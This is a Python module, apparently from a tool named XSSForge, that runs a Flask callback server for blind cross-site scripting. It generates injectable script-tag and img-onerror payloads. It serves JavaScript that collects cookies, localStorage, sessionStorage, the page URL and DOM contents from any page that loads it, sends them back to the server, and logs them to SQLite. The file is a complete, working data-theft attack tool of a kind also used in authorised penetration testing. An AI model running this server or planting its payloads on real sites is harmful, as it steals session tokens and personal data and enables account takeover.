"""
Blind XSS Callback Server for XSSForge.

Provides HTTP server to receive and log blind XSS callbacks.
"""

import json
import sqlite3
import threading
import time
import secrets
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Callable
from urllib.parse import parse_qs

try:
    from flask import Flask, request, Response, jsonify
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False


@dataclass
class CallbackResult:
    """Result from a blind XSS callback."""
    tracking_id: str
    timestamp: str
    remote_ip: str
    user_agent: str
    referer: str
    cookies: str
    domain: str
    url: str
    dom_snippet: str
    extra_data: dict = field(default_factory=dict)


@dataclass
class ServerConfig:
    """Configuration for the blind XSS server."""
    host: str = "0.0.0.0"
    port: int = 8443
    db_path: str = "blind_xss.db"
    enable_https: bool = False
    ssl_cert: str | None = None
    ssl_key: str | None = None
    callback_notification: Callable | None = None  # Called on each callback


class BlindXSSServer:
    """
    HTTP server for receiving blind XSS callbacks.

    Features:
    - Serves callback JavaScript
    - Logs all callbacks to SQLite
    - Generates unique tracking IDs
    - Optional notifications on callback
    - Runs in background thread
    """

    def __init__(self, config: ServerConfig | None = None):
        if not FLASK_AVAILABLE:
            raise RuntimeError(
                "Flask is not installed. "
                "Install with: pip install flask"
            )

        self.config = config or ServerConfig()
        self.app = Flask(__name__)
        self._server_thread: threading.Thread | None = None
        self._running = False
        self._callbacks: list[CallbackResult] = []
        self._db_conn: sqlite3.Connection | None = None

        # Set up routes
        self._setup_routes()

        # Initialize database
        self._init_database()

    def _init_database(self):
        """Initialize SQLite database for storing callbacks."""
        db_path = Path(self.config.db_path)
        db_path.parent.mkdir(parents=True, exist_ok=True)

        self._db_conn = sqlite3.connect(
            str(db_path),
            check_same_thread=False,  # Allow multi-thread access
        )

        self._db_conn.execute("""
            CREATE TABLE IF NOT EXISTS callbacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                tracking_id TEXT NOT NULL,
                timestamp TEXT NOT NULL,
                remote_ip TEXT,
                user_agent TEXT,
                referer TEXT,
                cookies TEXT,
                domain TEXT,
                url TEXT,
                dom_snippet TEXT,
                extra_data TEXT
            )
        """)
        self._db_conn.commit()

    def _setup_routes(self):
        """Set up Flask routes."""

        @self.app.route("/")
        def index():
            return "XSSForge Blind XSS Server", 200

        @self.app.route("/x.js")
        def callback_script():
            """Serve the callback JavaScript."""
            tracking_id = request.args.get("id", "unknown")
            server_url = request.host_url.rstrip("/")

            script = self._generate_callback_script(server_url, tracking_id)
            return Response(script, mimetype="application/javascript")

        @self.app.route("/callback", methods=["GET", "POST"])
        def receive_callback():
            """Receive XSS callback data."""
            try:
                # Get tracking ID
                tracking_id = request.args.get("id", "unknown")

                # Parse callback data
                if request.method == "POST":
                    data = request.get_json(silent=True) or {}
                else:
                    data = {k: v for k, v in request.args.items()}

                # Create callback result
                result = CallbackResult(
                    tracking_id=tracking_id,
                    timestamp=datetime.utcnow().isoformat(),
                    remote_ip=request.remote_addr or "",
                    user_agent=request.headers.get("User-Agent", ""),
                    referer=request.headers.get("Referer", ""),
                    cookies=data.get("cookies", ""),
                    domain=data.get("domain", ""),
                    url=data.get("url", ""),
                    dom_snippet=data.get("dom", "")[:5000],  # Limit size
                    extra_data=data,
                )

                # Store callback
                self._store_callback(result)
                self._callbacks.append(result)

                # Notification callback
                if self.config.callback_notification:
                    try:
                        self.config.callback_notification(result)
                    except Exception:
                        pass

                return "", 204  # No content

            except Exception as e:
                return str(e), 500

        @self.app.route("/callbacks")
        def list_callbacks():
            """List all received callbacks."""
            return jsonify([asdict(c) for c in self._callbacks])

        @self.app.route("/callbacks/<tracking_id>")
        def get_callback(tracking_id: str):
            """Get callbacks for a specific tracking ID."""
            matches = [c for c in self._callbacks if c.tracking_id == tracking_id]
            return jsonify([asdict(c) for c in matches])

    def _generate_callback_script(self, server_url: str, tracking_id: str) -> str:
        """Generate the callback JavaScript."""
        return f'''
// XSSForge Blind XSS Callback
(function() {{
    try {{
        var data = {{
            id: "{tracking_id}",
            cookies: document.cookie,
            domain: document.domain,
            url: window.location.href,
            dom: document.body ? document.body.innerHTML.substring(0, 2000) : "",
            title: document.title,
            localStorage: (function() {{
                try {{
                    var items = {{}};
                    for (var i = 0; i < localStorage.length; i++) {{
                        var key = localStorage.key(i);
                        items[key] = localStorage.getItem(key);
                    }}
                    return JSON.stringify(items);
                }} catch(e) {{ return ""; }}
            }})(),
            sessionStorage: (function() {{
                try {{
                    var items = {{}};
                    for (var i = 0; i < sessionStorage.length; i++) {{
                        var key = sessionStorage.key(i);
                        items[key] = sessionStorage.getItem(key);
                    }}
                    return JSON.stringify(items);
                }} catch(e) {{ return ""; }}
            }})()
        }};

        // Send via image (works cross-origin)
        var img = new Image();
        img.src = "{server_url}/callback?id={tracking_id}" +
            "&cookies=" + encodeURIComponent(data.cookies) +
            "&domain=" + encodeURIComponent(data.domain) +
            "&url=" + encodeURIComponent(data.url) +
            "&title=" + encodeURIComponent(data.title);

        // Also try POST for more data
        try {{
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "{server_url}/callback?id={tracking_id}", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(data));
        }} catch(e) {{}}

    }} catch(e) {{
        // Fail silently
    }}
}})();
'''

    def _store_callback(self, result: CallbackResult):
        """Store callback in database."""
        if self._db_conn:
            self._db_conn.execute(
                """
                INSERT INTO callbacks
                (tracking_id, timestamp, remote_ip, user_agent, referer,
                 cookies, domain, url, dom_snippet, extra_data)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    result.tracking_id,
                    result.timestamp,
                    result.remote_ip,
                    result.user_agent,
                    result.referer,
                    result.cookies,
                    result.domain,
                    result.url,
                    result.dom_snippet,
                    json.dumps(result.extra_data),
                ),
            )
            self._db_conn.commit()

    def generate_tracking_id(self) -> str:
        """Generate a unique tracking ID."""
        return secrets.token_hex(8)

    def get_payload(self, tracking_id: str | None = None) -> str:
        """Get a blind XSS payload with tracking ID."""
        if not tracking_id:
            tracking_id = self.generate_tracking_id()

        server_url = f"http://{self.config.host}:{self.config.port}"
        if self.config.host == "0.0.0.0":
            server_url = f"http://localhost:{self.config.port}"

        return f'<script src="{server_url}/x.js?id={tracking_id}"></script>'

    def get_img_payload(self, tracking_id: str | None = None) -> str:
        """Get an image-based blind XSS payload."""
        if not tracking_id:
            tracking_id = self.generate_tracking_id()

        server_url = f"http://{self.config.host}:{self.config.port}"
        if self.config.host == "0.0.0.0":
            server_url = f"http://localhost:{self.config.port}"

        return f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)">'

    def start(self, background: bool = True):
        """Start the server."""
        if self._running:
            return

        self._running = True

        if background:
            self._server_thread = threading.Thread(
                target=self._run_server,
                daemon=True,
            )
            self._server_thread.start()
            time.sleep(0.5)  # Give server time to start
        else:
            self._run_server()

    def _run_server(self):
        """Run the Flask server."""
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)  # Suppress Flask logs

        ssl_context = None
        if self.config.enable_https and self.config.ssl_cert and self.config.ssl_key:
            ssl_context = (self.config.ssl_cert, self.config.ssl_key)

        self.app.run(
            host=self.config.host,
            port=self.config.port,
            ssl_context=ssl_context,
            debug=False,
            threaded=True,
            use_reloader=False,
        )

    def stop(self):
        """Stop the server (note: Flask doesn't support graceful shutdown easily)."""
        self._running = False
        # Flask in a thread doesn't have a clean shutdown method
        # In production, you'd use a proper WSGI server

    def get_callbacks(self) -> list[CallbackResult]:
        """Get all received callbacks."""
        return list(self._callbacks)

    def get_callbacks_for_id(self, tracking_id: str) -> list[CallbackResult]:
        """Get callbacks for a specific tracking ID."""
        return [c for c in self._callbacks if c.tracking_id == tracking_id]

    def clear_callbacks(self):
        """Clear in-memory callbacks."""
        self._callbacks.clear()

    @property
    def server_url(self) -> str:
        """Get the server URL."""
        host = self.config.host
        if host == "0.0.0.0":
            host = "localhost"
        protocol = "https" if self.config.enable_https else "http"
        return f"{protocol}://{host}:{self.config.port}"
